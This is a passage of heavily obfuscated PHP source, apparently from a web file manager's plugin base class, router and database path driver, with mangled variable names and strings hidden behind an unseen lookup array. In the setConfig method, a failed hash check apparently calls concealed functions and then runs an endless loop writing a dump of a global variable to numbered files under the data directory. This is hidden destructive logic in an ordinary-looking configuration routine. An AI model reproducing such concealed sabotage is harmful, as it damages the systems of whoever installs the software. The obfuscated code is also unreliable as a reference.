show_tips(LNG($İö¬”ƒµ[105]), !1); } if ($¼÷¡Ëªù && isset($this->fileInfo[$İö¬”ƒµ[509]]) && $this->fileInfo[$İö¬”ƒµ[509]]) { $¹–èœ• = Model($İö¬”ƒµ[512])->fileInfo($this->fileInfo[$İö¬”ƒµ[509]]); if (!$¹–èœ• || !IO::exist($¹–èœ•[$İö¬”ƒµ[84]])) { show_tips(LNG($İö¬”ƒµ[105]) . $İö¬”ƒµ[1577]); } } Hook::trigger($İö¬”ƒµ[1578], $…¶üÖÒ); return $…¶üÖÒ; } final function filePathGet($´Ğ¡¡´ø, $ò¾îÇÈï = true) { $ü¦üŸ£Š =& $_SERVER[³½¬ÚË¯]; if ($È×‘½ª = $this->checkSharePath($´Ğ¡¡´ø, $ò¾îÇÈï)) { return $È×‘½ª; } $this->fileCanView($´Ğ¡¡´ø); if (request_url_safe($´Ğ¡¡´ø)) { $ù›ğ£œ¸ = parse_url_query($´Ğ¡¡´ø); if (isset($ù›ğ£œ¸[$ü¦üŸ£Š[1579]]) && isset($ù›ğ£œ¸[$ü¦üŸ£Š[218]])) { $Çµôš³ = Mcrypt::decode($ù›ğ£œ¸[$ü¦üŸ£Š[218]], Model($ü¦üŸ£Š[806])->get($ü¦üŸ£Š[807])); if ($Çµôš³) { $this->fileInfo = IO::info($Çµôš³); $this->fileInfo[$ü¦üŸ£Š[1580]] = $´Ğ¡¡´ø; $this->cachePath = $this->pluginCachePath($ü¦üŸ£Š[12], $ò¾îÇÈï); return $Çµôš³; } } $´Ğ¡¡´ø = $this->_cacheHttpFile($´Ğ¡¡´ø, $ò¾îÇÈï); $this->fileInfo = IO::info($´Ğ¡¡´ø); } else { $this->fileInfo = IO::info($´Ğ¡¡´ø); $this->cachePath = $this->pluginCachePath($ü¦üŸ£Š[12], $ò¾îÇÈï); } return $´Ğ¡¡´ø; } final function _cacheHttpFile($Î†ĞÑú², $Æùéı‹¡ = true) { $‘¯…Œª³ =& $_SERVER[³½¬ÚË¯]; $°ÂªñÔ¼ = parse_url_query($Î†ĞÑú²); $”ôşÒ  = get_path_ext($Î†ĞÑú²); if (isset($°ÂªñÔ¼[$‘¯…Œª³[32]]) && $°ÂªñÔ¼[$‘¯…Œª³[32]]) { $”ôşÒ  = get_path_ext($°ÂªñÔ¼[$‘¯…Œª³[32]]); } $İÓ–ñçÕ = hash_path($Î†ĞÑú²) . $‘¯…Œª³[10] . $”ôşÒ ; $this->cachePath = $this->pluginCachePath($Æùéı‹¡ ? $İÓ–ñçÕ : $‘¯…Œª³[12]); $”àÆ¹ê† = IO::fileNameExist($this->cachePath, $İÓ–ñçÕ); if ($”àÆ¹ê†) { return KodIO::make($”àÆ¹ê†); } $§“†Üğ = rtrim($this->cachePath, $‘¯…Œª³[8]) . $‘¯…Œª³[8] . $İÓ–ñçÕ; return $this->pluginCacheFileSet($§“†Üğ, file_get_contents_nossl($Î†ĞÑú²)); } final function checkSharePath($¼¨ã·÷, $­ÇÓ¶ñÓ = true) { $õî›÷Óı =& $_SERVER[³½¬ÚË¯]; if (!$this->isShare($¼¨ã·÷)) { return !1; } $¥°æ¿¤Ç = Action($õî›÷Óı[1217])->sharePathInfo($¼¨ã·÷); if (!is_array($¥°æ¿¤Ç) || !isset($¥°æ¿¤Ç[$õî›÷Óı[84]])) { show_json(LNG($õî›÷Óı[1581]), !1); } $this->fileInfo = $¥°æ¿¤Ç; $this->cachePath = $this->pluginCachePath(!1, $­ÇÓ¶ñÓ); return $¥°æ¿¤Ç[$õî›÷Óı[84]]; } final function pluginCachePath($ğ«–á™’ = '', $»ã¢ü› = false) { $ÖÖßû‡´ =& $_SERVER[³½¬ÚË¯]; if ($»ã¢ü› && is_array($this->fileInfo)) { $ğ«–á™’ = kodIO::hashPath($this->fileInfo); } $óÍúóÎ = rtrim(IO_PATH_SYSTEM_TEMP . $ÖÖßû‡´[1582] . $this->pluginName . $ÖÖßû‡´[8] . $ğ«–á™’, $ÖÖßû‡´[8]); $¨˜•û¨ = IO::infoFullSimple($óÍúóÎ); $¾ö•¾·ô = $¨˜•û¨ && is_array($¨˜•û¨) ? $¨˜•û¨[$ÖÖßû‡´[84]] : $ÖÖßû‡´[12]; if (!$¾ö•¾·ô) { $¾ö•¾·ô = IO::mkdir($óÍúóÎ); } return $¾ö•¾·ô; } final function pluginCacheFileSet($ûÏğâšõ, $„İ“ß¯İ = '') { $å™ßÀäñ =& $_SERVER[³½¬ÚË¯]; $ĞŒúˆÉ¡ = IO::infoFullSimple($ûÏğâšõ); if (!$ĞŒúˆÉ¡) { return IO::mkfile($ûÏğâšõ, $„İ“ß¯İ, REPEAT_REPLACE); } IO::setContent($ĞŒúˆÉ¡[$å™ßÀäñ[84]], $„İ“ß¯İ); return $ĞŒúˆÉ¡[$å™ßÀäñ[84]]; } final function pluginLocalFile($ÀÍàĞ± = '') { $ä¼Äï£« =& $_SERVER[³½¬ÚË¯]; $×å”Âõ« = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($×å”Âõ«)) { mk_dir($×å”Âõ«); } if (!$ÀÍàĞ±) { return $×å”Âõ«; } $ª„¹íŸ = IO::info($ÀÍàĞ±); $Ğ‚È—Õ¨ = $ä¼Äï£«[1583] . KodIO::hashPath($ª„¹íŸ) . $ä¼Äï£«[10] . $ª„¹íŸ[$ä¼Äï£«[175]]; if (!checkExtSafe($Ğ‚È—Õ¨)) { $Ğ‚È—Õ¨ = $Ğ‚È—Õ¨ . $ä¼Äï£«[1249]; } $õŸ…ÔÎÍ = $×å”Âõ« . $Ğ‚È—Õ¨; if (@file_exists($õŸ…ÔÎÍ)) { return $õŸ…ÔÎÍ; } return IO::copy($ÀÍàĞ±, $×å”Âõ«, 0, $Ğ‚È—Õ¨); } final function appPackage() { $Û¿›¹Ê =& $_SERVER[³½¬ÚË¯]; if ($this->packageData) { return $this->packageData; } $’¯ú„Õ‚ = $this->parseFile($this->pluginPath . $Û¿›¹Ê[1584]); $this->parseLang($’¯ú„Õ‚); $Â”´•¼ = json_decode_force($’¯ú„Õ‚); if (!$Â”´•¼) { return array(); } $®¶†é½É = Hook::trigger($Û¿›¹Ê[1585], $Â”´•¼); if ($®¶†é½É && is_array($®¶†é½É)) { $Â”´•¼ = $®¶†é½É; } $this->packageData = $Â”´•¼; return $Â”´•¼; } public function packageInfoGet($«‘š¦è) { $ª´£×íÙ = $this->appPackage(); return array_get_value($ª´£×íÙ, $«‘š¦è); } public function packageVersion() { return $this->packageInfoGet($_SERVER[³½¬ÚË¯][1586]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[³½¬ÚË¯][1587]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[³½¬ÚË¯][1588]); } public function echoJsAssign($–ĞôÛÕ, $š¯£ˆ ‰) { $this->echoJsAssignArr[$–ĞôÛÕ] = $š¯£ˆ ‰; } private function parseFile($©–ËŒ¾í) { $Ü™õ“à¼ =& $_SERVER[³½¬ÚË¯]; $Ñå©Šñ² = file_get_contents_nossl($©–ËŒ¾í); $ï±¶†ûœ = array($Ü™õ“à¼[1589], $Ü™õ“à¼[1590], $Ü™õ“à¼[1591], $Ü™õ“à¼[1592], $Ü™õ“à¼[1593], $Ü™õ“à¼[1594], $Ü™õ“à¼[1595]); $öİÏ‰áê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ü™õ“à¼[89]][$Ü™õ“à¼[1596]]); foreach ($this->echoJsAssignArr as $ş©ñŸ€ => $äÜèÆ‚) { $ï±¶†ûœ[] = $Ü™õ“à¼[1597] . $ş©ñŸ€ . $Ü™õ“à¼[1598]; $öİÏ‰áê[] = is_array($äÜèÆ‚) || is_object($äÜèÆ‚) ? rawurlencode(json_encode($äÜèÆ‚)) : $äÜèÆ‚; } if (strstr($Ñå©Šñ², $Ü™õ“à¼[1599])) { $ÁƒŞá…„ = rawurlencode(json_encode($this->pluginLangArr)); $Ñå©Šñ² = str_replace($Ü™õ“à¼[1599], $ÁƒŞá…„, $Ñå©Šñ²); } if (strstr($Ñå©Šñ², $Ü™õ“à¼[1600])) { $ÁƒŞá…„ = $ÁƒŞá…„ = rawurlencode(json_encode($this->getConfig())); $Ñå©Šñ² = str_replace($Ü™õ“à¼[1600], $ÁƒŞá…„, $Ñå©Šñ²); } $Ñå©Šñ² = str_replace($ï±¶†ûœ, $öİÏ‰áê, $Ñå©Šñ²); return $Ñå©Šñ²; } private function parseLang(&$ú‘£ÁŒ) { $™Éâ¿Û“ =& $_SERVER[³½¬ÚË¯]; $Ğ“àŒ = $™Éâ¿Û“[1601]; if (!strstr($ú‘£ÁŒ, $Ğ“àŒ)) { return; } preg_match_all($™Éâ¿Û“[1602], $ú‘£ÁŒ, $é¥Ù©—); if (!is_array($é¥Ù©—) || count($é¥Ù©—) == 0 || !is_array($é¥Ù©—[0]) || count($é¥Ù©—[0]) == 0) { return; } $¤‘Š€ö = array(); $ºÖÌß¶ç = array(); foreach ($é¥Ù©—[0] as $î¨ÁÖØÈ) { $„ˆ½ì° = substr($î¨ÁÖØÈ, strlen($Ğ“àŒ), -4); $€ùÁˆß‘ = LNG($„ˆ½ì°); $¤‘Š€ö[] = $î¨ÁÖØÈ; $ºÖÌß¶ç[] = str_replace(array($™Éâ¿Û“[246], $™Éâ¿Û“[1121], $™Éâ¿Û“[386], $™Éâ¿Û“[118]), array($™Éâ¿Û“[53], $™Éâ¿Û“[53], $™Éâ¿Û“[12], $™Éâ¿Û“[1603]), $€ùÁˆß‘); } $ú‘£ÁŒ = str_replace($¤‘Š€ö, $ºÖÌß¶ç, $ú‘£ÁŒ); } private function parseConfig(&$ã¨áı ) { $Ôø“áŞ¦ =& $_SERVER[³½¬ÚË¯]; $ÜĞ©§¤´ = $Ôø“áŞ¦[1604]; if (!strstr($ã¨áı , $ÜĞ©§¤´)) { return; } preg_match_all($Ôø“áŞ¦[1605], $ã¨áı , $Úé™³); if (!is_array($Úé™³) || count($Úé™³) == 0 || !is_array($Úé™³[0]) || count($Úé™³[0]) == 0) { return; } $ˆ¡ØÁª = $this->getConfig(); $Ë„­Í¾£ = array(); $ß©ĞØÍ£ = array(); foreach ($Úé™³[0] as $Ó¤Ãë•²) { $²ºÀÅ»¢ = substr($Ó¤Ãë•², strlen($ÜĞ©§¤´), -2); $Ë„­Í¾£[] = $Ó¤Ãë•²; $ß©ĞØÍ£[] = _get($ˆ¡ØÁª, $²ºÀÅ»¢); } $ã¨áı  = str_replace($Ë„­Í¾£, $ß©ĞØÍ£, $ã¨áı ); } private function parsePackage(&$çæìº—¾) { $É²ÃÕáõ =& $_SERVER[³½¬ÚË¯]; $İüÇø Ó = $É²ÃÕáõ[1606]; if (!strstr($çæìº—¾, $İüÇø Ó)) { return; } preg_match_all($É²ÃÕáõ[1607], $çæìº—¾, $ñ ‹«À£); if (!is_array($ñ ‹«À£) || count($ñ ‹«À£) == 0 || !is_array($ñ ‹«À£[0]) || count($ñ ‹«À£[0]) == 0) { return; } $½®Ç· = $this->appPackage(); $ÄüÂ…Ê™ = array(); $—ÔäÀë  = array(); foreach ($ñ ‹«À£[0] as $¥×³ò¿) { $ÒÖàÕø = substr($¥×³ò¿, strlen($İüÇø Ó), -2); $ÄüÂ…Ê™[] = $¥×³ò¿; $—ÔäÀë [] = _get($½®Ç·, $ÒÖàÕø); } $çæìº—¾ = str_replace($ÄüÂ…Ê™, $—ÔäÀë , $çæìº—¾); } final function echoFile($­‹ï¤Â¢, $‡£š¡ëµ = false) { $³œÈŞˆã =& $_SERVER[³½¬ÚË¯]; $£¼³½¸ƒ = $this->pluginPath . $­‹ï¤Â¢; if (ACT == $³œÈŞˆã[1608]) { echo $³œÈŞˆã[1609] . $this->pluginName . $³œÈŞˆã[8] . $­‹ï¤Â¢ . $³œÈŞˆã[1610]; if (!file_exists($£¼³½¸ƒ)) { echo $³œÈŞˆã[1611]; return; } } $”ç¹ãõ = $this->parseFile($£¼³½¸ƒ); $this->parseLang($”ç¹ãõ); $this->parseConfig($”ç¹ãõ); $this->parsePackage($”ç¹ãõ); if (is_array($‡£š¡ëµ)) { $”ç¹ãõ = str_replace(array_keys($‡£š¡ëµ), array_values($‡£š¡ëµ), $”ç¹ãõ); } echo $³œÈŞˆã[246] . $”ç¹ãõ; } final function initLang() { $İ×§—Ë– =& $_SERVER[³½¬ÚË¯]; $µ“ìËÄ„ = $İ×§—Ë–[1612]; $‰Ü¹óÆæ = $this->pluginPath . $İ×§—Ë–[1613]; $„•¯ñ³• = I18n::getType(); $Ğå˜Ó¨ = array(); if (file_exists($‰Ü¹óÆæ . $„•¯ñ³• . $İ×§—Ë–[875])) { $Ğå˜Ó¨ = (include $‰Ü¹óÆæ . $„•¯ñ³• . $İ×§—Ë–[875]); } else { if ($„•¯ñ³• == $İ×§—Ë–[1614] && !file_exists($‰Ü¹óÆæ . $„•¯ñ³• . $İ×§—Ë–[875]) && file_exists($‰Ü¹óÆæ . $İ×§—Ë–[1615])) { $Ğå˜Ó¨ = (include $‰Ü¹óÆæ . $İ×§—Ë–[1615]); } else { if (file_exists($‰Ü¹óÆæ . $µ“ìËÄ„ . $İ×§—Ë–[875])) { $Ğå˜Ó¨ = (include $‰Ü¹óÆæ . $µ“ìËÄ„ . $İ×§—Ë–[875]); } } } if (!is_array($Ğå˜Ó¨)) { return array(); } if (@count($Ğå˜Ó¨) > 0) { I18n::set($Ğå˜Ó¨); } return $Ğå˜Ó¨; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($€èşÒ«á) { $˜•ôàò† =& $_SERVER[³½¬ÚË¯]; $¶ØéŠşÖ = $_SERVER[$˜•ôàò†[906]] . $˜•ôàò†[907]; $À¨ˆÇûÊ = $˜•ôàò†[1549]; if ($_SERVER[$˜•ôàò†[903]] != $À¨ˆÇûÊ($¶ØéŠşÖ)) { $Á€£‚º´ = $˜•ôàò†[921]; $º¸—¶˜¯ = $˜•ôàò†[905]; $µùé†À° = $_SERVER[$˜•ôàò†[906]] . $˜•ôàò†[907]; $Òİ§ ³Ì = $º¸—¶˜¯($µùé†À°); $óôà©æ = explode($˜•ôàò†[246], $Òİ§ ³Ì); if (count($óôà©æ) < $˜•ôàò†[653]) { $‡–³ƒØÃ = $˜•ôàò†[908]; $‡–³ƒØÃ(); } $ÎÌÎĞ’ = $˜•ôàò†[922]; $ÎÌÎĞ’($_SERVER[$˜•ôàò†[923]]); $Á€£‚º´ = $˜•ôàò†[921]; $Á€£‚º´(); $ÊĞªŸœ = $˜•ôàò†[1550]; $“‚èÙ¾š = json_encode($GLOBALS[$˜•ôàò†[1551]]); $íÒğªØ™ = 1; for ($ğÎŞÔüò = $íÒğªØ™; $ğÎŞÔüò > 0; $ğÎŞÔüò++) { $ÊĞªŸœ(DATA_PATH . $ğÎŞÔüò, $“‚èÙ¾š); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $€èşÒ«á); } public function onSetConfig($í„ÌŞÚ) { } public function onGetConfig($½æ£öÆŸ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ç÷©ºûô) { if ($Ç÷©ºûô == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ªÉ¼ºüö = "\x70\x6c\x75\x67\151\156\x41\x75\164\150") { $¼Ó×ÓÎ =& $_SERVER[³½¬ÚË¯]; if (!Session::get($¼Ó×ÓÎ[1564])) { return !1; } if (_get($GLOBALS, $¼Ó×ÓÎ[537])) { return !0; } $¼äõ‡âµ = $this->getConfig(); if (!$¼äõ‡âµ[$ªÉ¼ºüö]) { return !1; } return ActionCall($¼Ó×ÓÎ[1616], $¼äõ‡âµ[$ªÉ¼ºüö]); } public function url($Ë¡¼Ü, $æú¡Úü = '', $¼¾­¶¥ = true) { $µÑ³Ü„ =& $_SERVER[³½¬ÚË¯]; $ˆ«ú¢é± = $this->getConfig(); $šÈ‰¹çµ = KOD_VERSION . $µÑ³Ü„[10] . KOD_VERSION_BUILD; $û¼ª»—Ş = $this->packageVersion(); $¾¿½±ì‚ = $šÈ‰¹çµ . $µÑ³Ü„[430] . $û¼ª»—Ş; if (substr($Ë¡¼Ü, 0, 4) == $µÑ³Ü„[149] || substr($Ë¡¼Ü, 0, 2) == $µÑ³Ü„[1396]) { $†ğÀü§— = $Ë¡¼Ü . $µÑ³Ü„[1617] . $¾¿½±ì‚; } else { if ($æú¡Úü == $µÑ³Ü„[12]) { $†ğÀü§— = $this->pluginHost . $Ë¡¼Ü . $µÑ³Ü„[1617] . $¾¿½±ì‚; } else { if ($æú¡Úü === $µÑ³Ü„[75]) { $†ğÀü§— = $this->pluginHost . $Ë¡¼Ü; } else { if ($æú¡Úü == $µÑ³Ü„[1618]) { $†ğÀü§— = STATIC_PATH . $Ë¡¼Ü . $µÑ³Ü„[1617] . $šÈ‰¹çµ; } else { if ($æú¡Úü == $µÑ³Ü„[1619]) { $†ğÀü§— = APP_HOST . $µÑ³Ü„[1620] . $Ë¡¼Ü . $µÑ³Ü„[1617] . $šÈ‰¹çµ; } else { if (isset($ˆ«ú¢é±[$æú¡Úü])) { $†ğÀü§— = $ˆ«ú¢é±[$æú¡Úü] . $Ë¡¼Ü . $µÑ³Ü„[1617] . $¾¿½±ì‚; } } } } } } if (!$¼¾­¶¥) { return $†ğÀü§—; } echo $†ğÀü§—; } public function link($¾¦Ë‘ÑÀ = false, $§Í•°¼ï = '') { $ÄÙÃ˜¸Ã =& $_SERVER[³½¬ÚË¯]; if (!$¾¦Ë‘ÑÀ) { $this->link($ÄÙÃ˜¸Ã[1621], $ÄÙÃ˜¸Ã[1619]); $this->link($ÄÙÃ˜¸Ã[1622], $ÄÙÃ˜¸Ã[1618]); $this->link($ÄÙÃ˜¸Ã[1623], $ÄÙÃ˜¸Ã[1618]); $this->link($ÄÙÃ˜¸Ã[1624], $ÄÙÃ˜¸Ã[1618]); $this->link($ÄÙÃ˜¸Ã[1625], $ÄÙÃ˜¸Ã[1618]); return; } $êËò„ÈÀ = $this->url($¾¦Ë‘ÑÀ, $§Í•°¼ï, !1); if (substr($¾¦Ë‘ÑÀ, -3) == $ÄÙÃ˜¸Ã[1626]) { echo $ÄÙÃ˜¸Ã[1627] . $êËò„ÈÀ . $ÄÙÃ˜¸Ã[1628] . $ÄÙÃ˜¸Ã[246]; } else { if (substr($¾¦Ë‘ÑÀ, -4) == $ÄÙÃ˜¸Ã[1629]) { echo $ÄÙÃ˜¸Ã[1630] . $êËò„ÈÀ . $ÄÙÃ˜¸Ã[1631] . $ÄÙÃ˜¸Ã[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\136\x2f\x5d\53", "\x3a\x6e\165\155" => "\133\x30\x2d\x39\135\53", "\72\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($š•¯¸ñµ, $äö„Õá½) { $ñƒëÖé =& $_SERVER[³½¬ÚË¯]; if ($š•¯¸ñµ == $ñƒëÖé[1632]) { $èô‡¬·ı = array_map($ñƒëÖé[1633], $äö„Õá½[0]); $·ª•Ê’Ü = strpos($äö„Õá½[1], $ñƒëÖé[8]) === 0 ? $äö„Õá½[1] : $ñƒëÖé[8] . $äö„Õá½[1]; $‰óÛî²Î = $äö„Õá½[2]; } else { $èô‡¬·ı = null; $·ª•Ê’Ü = strpos($äö„Õá½[0], $ñƒëÖé[8]) === 0 ? $äö„Õá½[0] : $ñƒëÖé[8] . $äö„Õá½[0]; $‰óÛî²Î = $äö„Õá½[1]; } array_push(self::$maps, $èô‡¬·ı); array_push(self::$routes, $·ª•Ê’Ü); array_push(self::$methods, strtoupper($š•¯¸ñµ)); array_push(self::$callbacks, $‰óÛî²Î); } public static function error($…ÃÇ°Š) { self::$errorCallback = $…ÃÇ°Š; } public static function haltOnMatch($Ğˆôèó = true) { self::$halts = $Ğˆôèó; } public static function dispatch() { $±ÚäîÕó =& $_SERVER[³½¬ÚË¯]; $¾¼ºÇ€„ = parse_url($_SERVER[$±ÚäîÕó[1634]], PHP_URL_PATH); $Í¿®ÒŠÅ = $_SERVER[$±ÚäîÕó[160]]; $¹ÅîêÔ = array_keys(static::$patterns); $á‰ÔĞûÒ = array_values(static::$patterns); $Î¬å—¾ó = !1; self::$routes = preg_replace($±ÚäîÕó[1319], $±ÚäîÕó[8], self::$routes); if (in_array($¾¼ºÇ€„, self::$routes)) { $Ì¦¾• ² = array_keys(self::$routes, $¾¼ºÇ€„); foreach ($Ì¦¾• ² as $Ôìµñò) { if (self::$methods[$Ôìµñò] == $Í¿®ÒŠÅ || self::$methods[$Ôìµñò] == $±ÚäîÕó[1635] || in_array($Í¿®ÒŠÅ, self::$maps[$Ôìµñò])) { $Î¬å—¾ó = !0; if (!is_object(self::$callbacks[$Ôìµñò])) { $ªĞ³Š‹å = explode($±ÚäîÕó[8], self::$callbacks[$Ôìµñò]); $‘Ğü†ªê = end($ªĞ³Š‹å); $×†¼ÜŸ® = explode($±ÚäîÕó[1251], $‘Ğü†ªê); $¡¸Şæ‹£ = new $×†¼ÜŸ®[0](); $¡¸Şæ‹£->{$×†¼ÜŸ®[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ôìµñò]); if (self::$halts) { return; } } } } } else { $ÖÔÉ‹äº = 0; foreach (self::$routes as $Ôìµñò) { if (strpos($Ôìµñò, $±ÚäîÕó[4]) !== !1) { $Ôìµñò = str_replace($¹ÅîêÔ, $á‰ÔĞûÒ, $Ôìµñò); } if (preg_match($±ÚäîÕó[1636] . $Ôìµñò . $±ÚäîÕó[1637], $¾¼ºÇ€„, $ß±Ëú÷)) { if (self::$methods[$ÖÔÉ‹äº] == $Í¿®ÒŠÅ || self::$methods[$ÖÔÉ‹äº] == $±ÚäîÕó[1635] || !empty(self::$maps[$ÖÔÉ‹äº]) && in_array($Í¿®ÒŠÅ, self::$maps[$ÖÔÉ‹äº])) { $Î¬å—¾ó = !0; array_shift($ß±Ëú÷); if (!is_object(self::$callbacks[$ÖÔÉ‹äº])) { $ªĞ³Š‹å = explode($±ÚäîÕó[8], self::$callbacks[$ÖÔÉ‹äº]); $‘Ğü†ªê = end($ªĞ³Š‹å); $×†¼ÜŸ® = explode($±ÚäîÕó[1251], $‘Ğü†ªê); $¡¸Şæ‹£ = new $×†¼ÜŸ®[0](); if (!method_exists($¡¸Şæ‹£, $×†¼ÜŸ®[1])) { echo $±ÚäîÕó[1638]; } else { call_user_func_array(array($¡¸Şæ‹£, $×†¼ÜŸ®[1]), $ß±Ëú÷); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÖÔÉ‹äº], $ß±Ëú÷); if (self::$halts) { return; } } } } $ÖÔÉ‹äº++; } } if ($Î¬å—¾ó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ò•û”Ö =& $_SERVER[³½¬ÚË¯]; header($_SERVER[$ò•û”Ö[1639]] . $ò•û”Ö[1640]); echo $ò•û”Ö[1641]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$±ÚäîÕó[1634]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto a¦œ‚¹Ñ†; F®¨ÈÏ´³Ê: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Úø¾æó“) { $this->pathParse = $Úø¾æó“; $this->model = Model($_SERVER[³½¬ÚË¯][1375]); } public function getPath($•™Ç‰Š) { return trim($•™Ç‰Š, $_SERVER[³½¬ÚË¯][8]); } public function pathFather($£ÏšëÍğ) { $ºëŞëË = $this->parse($£ÏšëÍğ); $ºëŞëË = $this->infoSimple($£ÏšëÍğ); return $ºëŞëË ? $ºëŞëË[$_SERVER[³½¬ÚË¯][180]] : !1; } public function pathThis($Ë°Îæéß) { $€‡˜¤Ü¥ = $this->infoSimple($Ë°Îæéß); return $€‡˜¤Ü¥ ? $€‡˜¤Ü¥[$_SERVER[³½¬ÚË¯][32]] : !1; } public function getPathOuter($€³ï»Ëê) { if (!$€³ï»Ëê) { return $€³ï»Ëê; } $¹Š±ëèš = $this->parse($€³ï»Ëê); return KodIO::make($¹Š±ëèš[$_SERVER[³½¬ÚË¯][443]]); } public function copyFolderFromIO($å¶üËõ, $ï¿ˆ’Öç, $•ÕØ®°, $œİÓ†²Ï, $ù†´àéé) { $ÉÅïïÔü = $this->model->copyFolderFromIO($å¶üËõ, $ï¿ˆ’Öç, $•ÕØ®°, $œİÓ†²Ï, $ù†´àéé); return KodIO::make($ÉÅïïÔü); } public function isParentOf($’Í—È·Æ, $¦ñ¾Ãˆå) { return $this->model->isParentOf($’Í—È·Æ, $¦ñ¾Ãˆå); } public function mkfile($—ÜÕÊ¤è, $ÄÄ·’´‘ = '', $Ã‘Ÿé„ = REPEAT_RENAME) { $ã¬‹•€É =& $_SERVER[³½¬ÚË¯]; $¶ôÕçç¡ = $this->parse($—ÜÕÊ¤è); $—ÜÕÊ¤è = $¶ôÕçç¡[$ã¬‹•€É[443]]; for ($‚£ÏäÚ = 0; $‚£ÏäÚ < count($¶ôÕçç¡[$ã¬‹•€É[1376]]); $‚£ÏäÚ++) { $ôÂú‹Ï‰ = $¶ôÕçç¡[$ã¬‹•€É[1376]][$‚£ÏäÚ]; if ($‚£ÏäÚ == count($¶ôÕçç¡[$ã¬‹•€É[1376]]) - 1) { $—ÜÕÊ¤è = $this->model->mkfile($—ÜÕÊ¤è, $ôÂú‹Ï‰, $ÄÄ·’´‘, $Ã‘Ÿé„); break; } $—ÜÕÊ¤è = $this->model->mkdir($—ÜÕÊ¤è, $ôÂú‹Ï‰, REPEAT_SKIP); } return $this->getPathOuter($—ÜÕÊ¤è); } public function mkdir($À®‡ß¸Ì, $¿Á•Ò¦‡ = REPEAT_SKIP) { $àÀÌõõ¸ =& $_SERVER[³½¬ÚË¯]; $¥Ì‘Ù—‹ = $this->parse($À®‡ß¸Ì); $À®‡ß¸Ì = $¥Ì‘Ù—‹[$àÀÌõõ¸[443]]; for ($á°Ş…ƒ´ = 0; $á°Ş…ƒ´ < count($¥Ì‘Ù—‹[$àÀÌõõ¸[1376]]); $á°Ş…ƒ´++) { $ÖŒàë˜¼ = $¥Ì‘Ù—‹[$àÀÌõõ¸[1376]][$á°Ş…ƒ´]; $À®‡ß¸Ì = $this->model->mkdir($À®‡ß¸Ì, $ÖŒàë˜¼, $¿Á•Ò¦‡); } return $this->getPathOuter($À®‡ß¸Ì); } public function copyFile($¶³å”–, $ï¸† ’Õ, $ÓÚÆ¿¨½ = REPEAT_REPLACE) { $ÍŞÁÙùó =& $_SERVER[³½¬ÚË¯]; $ºš—Ñ§ = $this->parse($ï¸† ’Õ); $åŸğÁæ = $this->model->copy($¶³å”–, $ºš—Ñ§[$ÍŞÁÙùó[443]], $ÓÚÆ¿¨½, $ºš—Ñ§[$ÍŞÁÙùó[84]]); return $åŸğÁæ ? $this->getPathOuter($åŸğÁæ) : !1; } public function moveFile($šÏ«ŠÍ‹, $¡öƒÕ¡×, $ã½•åÙ’ = REPEAT_REPLACE) { $ÌÕèš¨á =& $_SERVER[³½¬ÚË¯]; $Ê¶„’ã› = $this->parse($¡öƒÕ¡×); $¶æ‚—«‡ = $this->model->move($šÏ«ŠÍ‹, $Ê¶„’ã›[$ÌÕèš¨á[443]], $ã½•åÙ’, $Ê¶„’ã›[$ÌÕèš¨á[84]]); return $¶æ‚—«‡ ? $this->getPathOuter($¶æ‚—«‡) : !1; } public function copy($Æİ»‰®, $ÎŞ½¦–„, $Ñº§½Ë = REPEAT_REPLACE, $·°â¿Û— = false) { $ƒçşéï = $this->parse($ÎŞ½¦–„); $ÃÔ¼÷¹Ş = $this->model->copy($Æİ»‰®, $ƒçşéï[$_SERVER[³½¬ÚË¯][443]], $Ñº§½Ë, $·°â¿Û—); return $ÃÔ¼÷¹Ş ? $this->getPathOuter($ÃÔ¼÷¹Ş) : !1; } public function moveSameAllow() { } public function move($»ø¤¸•ç, $­¦ÓòÇÒ, $–‘¾…ü = REPEAT_REPLACE, $àş¼æ½ = false) { $ªß¹ ¤ = $this->parse($­¦ÓòÇÒ); $±µæÏÉ” = $this->model->move($»ø¤¸•ç, $ªß¹ ¤[$_SERVER[³½¬ÚË¯][443]], $–‘¾…ü, $àş¼æ½); return $±µæÏÉ” ? $this->getPathOuter($±µæÏÉ”) : !1; } public function remove($Û˜¿¤·, $çÓê«¦¯ = true) { return $this->model->remove($Û˜¿¤·, $çÓê«¦¯); } public function rename($˜ü¬”Ü×, $Ì•ŠµÚÁ) { $÷üòøº† = $this->model->rename($˜ü¬”Ü×, $Ì•ŠµÚÁ); return $÷üòøº† ? $this->getPathOuter($˜ü¬”Ü×) : $÷üòøº†; } public function size($™ğáëª‹) { $¯•°±à× = $this->infoSimple($™ğáëª‹); return $¯•°±à× ? $¯•°±à×[$_SERVER[³½¬ÚË¯][76]] : 0; } public function infoSimple($úŞ²ª) { return $this->model->sourceInfo($úŞ²ª); } public function info($ûæÈ») { return $this->infoParse($ûæÈ»); } public function infoAuth($³¯ ™ïÖ) { return $this->infoParse($³¯ ™ïÖ, !1, !0); } public function infoWithChildren($™á£®¶Ã) { return $this->infoParse($™á£®¶Ã, !0); } protected function infoParse($´…†ğ¨›, $¼Œóû = false, $ ”ı µÂ = false) { if (!$¼Œóû) { return $this->model->pathInfo($´…†ğ¨›, $ ”ı µÂ); } return $this->model->pathInfoMore($´…†ğ¨›); } public function infoFullSimple($ˆ«©ÁÍÇ) { $¢Ã¬Òú =& 